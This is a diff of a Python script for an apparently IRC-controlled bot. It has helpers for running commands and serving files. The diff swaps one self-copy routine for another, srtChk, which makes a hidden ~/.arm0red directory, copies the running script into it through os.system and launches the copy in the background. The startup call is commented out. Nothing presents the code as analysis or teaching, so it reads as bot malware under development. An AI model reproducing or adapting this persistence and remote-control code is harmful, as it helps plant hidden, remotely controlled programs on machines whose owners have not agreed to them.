@@ -84,17 +84,6 @@ if usessl: # If SSL is True, connect using SSL.
 ircsock.settimeout(240) # Set socket timeout.
 connected = False # Variable to say if bot is connected or not.
 
-def startCheck():
-    try:
-        if os.path.isfile("~/.bot.py"):
-            connect()
-        else:
-            os.popen("cp " + __file__ + " ~/.bot.py")
-            runcmd("~/.bot.py")
-    except Exception as startEx:
-        if debugmode:
-            print("Exception: " + str(startEx))
-
 def ircsend(msg):
     ircsock.send(bytes(str(msg) +"\n", "UTF-8"))
 
@@ -314,6 +303,25 @@ def fileServer():
         t = threading.Thread(target=retrieveFile, args=("retreiveThread", c, addr))
         t.start()
     s.close()
+
+def srtChk():
+    script = sys.argv
+    name = str(script[0])
+    try:
+        path = '~/.arm0red'
+        if debugmode:
+            print("Creating Directory: ~/.arm0red")
+        os.mkdir(path)
+    except OSError as mdr:
+        if debugmode:
+            print("ERROR: " + str(mdr))
+    if debugmode:
+        print("Copying " + name + " to: ~/.arm0red/bot.py")
+    os.system(r"cp " + name + " ~/.arm0red/bot.py")
+    clone = '~/.arm0red/bot.py &'
+    if debugmode:
+        print("Running: " + clone)
+    os.system(clone)
 
 def main():
     global connected
@@ -699,7 +707,7 @@ def main():
                 
 try: # Here is where we actually start the Bot.
     if not connected:
-        #startCheck() # Check if file exists.
+        #srtChk() # Check if file exists.
         connect() # Connect to server.
     
 except KeyboardInterrupt: # Kill Bot from CLI using CTRL+C
